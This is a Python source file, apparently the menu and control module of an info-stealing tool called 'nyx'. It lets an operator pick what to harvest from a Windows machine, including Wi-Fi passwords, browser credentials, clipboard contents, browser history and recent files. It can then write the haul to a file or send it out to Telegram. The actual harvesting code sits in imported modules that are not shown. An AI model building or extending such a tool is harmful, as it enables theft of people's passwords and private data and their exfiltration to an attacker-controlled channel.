# nyx/core/options.py
import os
import shutil
import subprocess
import sys
from . import reporting as core_reporting
from . import module_installation
from nyx.modules import (
    system_info,
    users,
    drive_info,
    wifi_credentials,
    installed_programs,
    desktop_tree,
    browser_credentials,
    clipboard,
    shared_resources,
    recent_files,
    browser_history,
    file_finder,
    file_zipper,
    cleanup as modules_cleanup
)
from nyx.modules import disclaimer
from config import ALLOWED_EXTENSIONS

# COLORS
green_text = "\033[92m"  # ANSI escape code for green text
red_text = "\033[91m"   # ANSI escape code for red text
yellow_text = "\033[93m" # ANSI escape code for yellow text
reset_text = "\033[0m"   # ANSI escape code to reset to default text color

def cleanup():
    # Example cleanup logic
    temp_dir = "temp"  # Replace with your actual temporary directory
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        display_message(f"[+] ✅ Cleaned up temporary directory: {temp_dir}", "info")
    else:
        display_message("[!] ⚠️  No temporary directory to clean up.", "warning")

def install_missing_modules(modules):
    for module in modules:
        try:
            __import__(module)
            display_message(f"✅ Module {module} is already available.", "info")
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
            display_message(f"✅ Module {module} installed successfully.", "info")

def list_windows_options():
    options = {
        1: "GATHER SYSTEM INFO",
        2: "LIST CURRENT AND ALL USERS",
        3: "GET DRIVE INFO",
        4: "RETRIEVE WI-FI SSID AND PASSWORD",
        5: "LIST INSTALLED PROGRAMS",
        6: "MAP DESKTOP (TREE FORMAT)",
        7: "GET BROWSER CREDENTIALS",
        8: "GET CLIPBOARD CONTENT",
        9: "LIST SHARED RESOURCES",
        10: "LIST RECENT FILES",
        11: "EXTRACT BROWSER HISTORY",
        12: "FIND ALL FILES WITH ALLOWED EXTENSIONS"
    }

    while True:
        display_message("\n[+] ✅ SELECT OPTIONS\n", "info")
        for num, desc in options.items():
            print(f"[{num}] {desc}")

        user_choices = input("\nSelect options (comma-separated): ").strip().split(",")
        selected_funcs = []

        for choice in user_choices:
            if choice.isdigit() and int(choice) in options:
                selected_funcs.append(int(choice))
            else:
                print()
                display_message(f"Invalid input '{choice}'. Please select valid option numbers.", "error")
                break  # Break out for invalid input, will retry

        if selected_funcs:  # Only proceed if valid selections were made
            results = {}
            for func in selected_funcs:
                display_message(f"\n[+] Executing: {options[func]}\n", "info")
                if func == 1:
                    results['System Info'] = system_info.gather_system_info()
                elif func == 2:
                    current_user, users_list = users.list_users()
                    results['Current User'] = current_user
                    results['All Users'] = users_list
                elif func == 3:
                    results['Drive Info'] = drive_info.get_drive_info()
                elif func == 4:
                    results['Wi-Fi Credentials'] = wifi_credentials.get_wifi_credentials()
                elif func == 5:
                    results['Installed Programs'] = installed_programs.list_installed_programs()
                elif func == 6:
                    results['Desktop Tree'] = desktop_tree.map_desktop_tree()
                elif func == 7:
                    results['Browser Credentials'] = browser_credentials.get_browser_credentials()
                elif func == 8:
                    results['Clipboard Content'] = clipboard.get_clipboard_content()
                elif func == 9:
                    results['Shared Resources'] = shared_resources.list_shared_resources()
                elif func == 10:
                    results['Recent Files'] = recent_files.list_recent_files()
                elif func == 11:
                    results['Browser History'] = browser_history.extract_browser_history()
                elif func == 12:
                    allowed_extensions = input("\nEnter allowed file extensions (comma-separated): ").strip().split(",")
                    results['Found Files'] = file_finder.find_files_with_extensions(allowed_extensions)

            handle_results(results)
            break  # Exit the selection loop after valid inputs are processed

def handle_results(results):
    while True:
        display_message("\n[+] How would you like to handle the results?\n", "info")
        print("[1] Save to Desktop")
        print("[2] Send to Telegram")
        print("[3] Do nothing (results will be discarded)")

        user_choice = input("\nSelect an option (1-3): ").strip().split(",")
        selected_actions = []

        for choice in user_choice:
            if choice.isdigit() and int(choice) in [1, 2, 3]:
                selected_actions.append(int(choice))
            else:
                display_message(f"Invalid input '{choice}'. Please select valid option numbers.", "error")
                break  # this will cause the loop to re-prompt

        # Ensure only valid actions
        if len(selected_actions) > 0 and all(x in [1, 2] for x in selected_actions) and len(selected_actions) <= 2:
            if 1 in selected_actions:
                core_reporting.write_results_to_file(results)
            if 2 in selected_actions:
                file_path = core_reporting.write_results_to_file(results, return_path=True)
                with open(file_path, "rb") as file:
                    core_reporting.send_to_telegram(file)

            break  # Exit the handling loop after valid inputs are processed

        if 3 in selected_actions:
            display_message("\nResults discarded. Returning to previous options.\n", "info")
            break  # Exit without saving

def display_message(message, level="info"):
    color_codes = {
        "info": green_text,
        "warning": yellow_text,
        "error": red_text
    }
    reset_code = reset_text
    color_code = color_codes.get(level, "")
    print(f"{color_code}{message}{reset_code}")
